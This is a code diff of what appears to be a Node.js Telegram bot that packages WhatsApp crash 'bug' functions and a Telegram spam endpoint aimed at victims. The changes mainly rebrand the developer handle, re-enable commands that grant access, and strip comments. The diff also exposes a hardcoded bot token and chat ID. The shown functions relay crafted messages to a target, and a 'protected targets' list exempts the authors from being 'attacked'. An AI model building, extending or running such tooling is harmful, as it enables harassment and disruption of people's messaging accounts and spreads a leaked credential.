@@ -7,10 +7,10 @@ const path = require("path");
 const config = require("./database/config.js");
 const axios = require("axios");
 const express = require('express');
-const fetch = require("node-fetch"); // pastikan sudah install node-fetch
+const fetch = require("node-fetch");
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
-//const { InlineKeyboard } = require("grammy");
+const { InlineKeyboard } = require("grammy");
 const { spawn } = require('child_process');
 const {
 default: makeWASocket,
@@ -622,7 +622,7 @@ bot.command("start", async (ctx) => {
 <i>latest styles, lots of tools, and improved security system</i>
 
 <blockquote>「 Information 」</blockquote>
-<b>Developer : @AiiSigma</b>
+<b>Developer : @vannhosting</b>
 <b>Version   : 3 ⧸ <code>III</code></b>
 <b>Username  : ${username}</b>
 
@@ -685,7 +685,7 @@ bot.hears("ℹ️ Bot Info", async (ctx) => {
 • Secure Operations
 
 <b>📞 Support:</b>
-Contact @AiiSigma for assistance
+Contact @vannhosting for assistance
 `;
 
   await ctx.reply(infoText, {
@@ -697,7 +697,7 @@ Contact @AiiSigma for assistance
 });
 
 bot.hears("💬 Chat", (ctx) => {
-  ctx.reply("💬 Chat dengan developer: https://t.me/AiiSigma");
+  ctx.reply("💬 Chat dengan developer: https://t.me/vannhosting");
 });
 
 bot.hears("📢 Channel", (ctx) => {
@@ -746,7 +746,7 @@ bot.action("show_bot_info", async (ctx) => {
 • Secure Operations
 
 <b>📞 Support:</b>
-Contact @AiiSigma for assistance
+Contact @vannhosting for assistance
 `;
 
   const keyboard = Markup.inlineKeyboard([
@@ -769,7 +769,7 @@ bot.action("back_to_main", async (ctx) => {
 <i>latest styles, lots of tools, and improved security system</i>
 
 <blockquote>「 Information 」</blockquote>
-<b>Developer : @AiiSigma</b>
+<b>Developer : @vannhosting</b>
 <b>Version   : 3 ⧸ <code>III</code></b>
 <b>Username  : ${username}</b>
 
@@ -942,7 +942,6 @@ bot.command("myrole", (ctx) => {
   `, { parse_mode: "HTML" });
 });
 
-/* simpen aja dlu soalnya ga guna
 bot.command("addacces", (ctx) => {
   const userId = ctx.from.id.toString();
   const id = ctx.message.text.split(" ")[1];
@@ -977,7 +976,7 @@ bot.command("delacces", (ctx) => {
   data.akses = data.akses.filter(uid => uid !== id);
   saveAkses(data);
   ctx.reply(`✓ Access to user ID ${id} removed.`);
-});*/
+});
 
 bot.command("addowner", (ctx) => {
   const userId = ctx.from.id.toString();
@@ -1111,10 +1110,7 @@ setInterval(() => {
 }, 10 * 60 * 1000); // Check setiap 10 menit
 
 // ================ FUNCTION BUGS HERE ================== \\
-/*
-  Function nya isi Ama function punya lu sendiri
-*/
-// FUNCTION BLANK
+
 async function N3xithBlank(sock, X) {
   const msg = {
     newsletterAdminInviteMessage: {
@@ -1598,7 +1594,7 @@ async function PLottiEStcJv(sock, target) {
     await sock.relayMessage(target, PouMsg1.message, { 
     messageId: PouMsg1.key.id 
     })
-    console.log("DONE BY AiiSigma")
+    console.log("DONE BY VANNHOSTING")
 
   } catch (bokepPou3menit) {
     console.error("EROR COK:", bokepPou3menit)
@@ -2293,13 +2289,6 @@ app.get("/ig-dl", requireAuth, (req, res) => {
   });
 });
       
-/* 
-USER DETECTIONS - HARAP DI BACA !!!
-MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU
-
-Gunanya buat apa bang?
-itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
-*/
 const BOT_TOKEN = "8198417165:AAGRdppBnltMwvGRDxeC1TeUVZMamLMHoUc";
 const CHAT_ID = "7517485937";
 // simpan waktu terakhir eksekusi (global cooldown)
@@ -2518,7 +2507,7 @@ app.post('/api/telegram-spam', async (req, res) => {
         }
 
         // Protected targets - tidak boleh diserang
-        const protectedTargets = ['@AiiSigma', '7250235697'];
+        const protectedTargets = ['@vannhosting', '7517485937'];
         if (protectedTargets.includes(chatId)) {
             return res.json({ success: false, error: 'Protected target cannot be attacked' });
         }
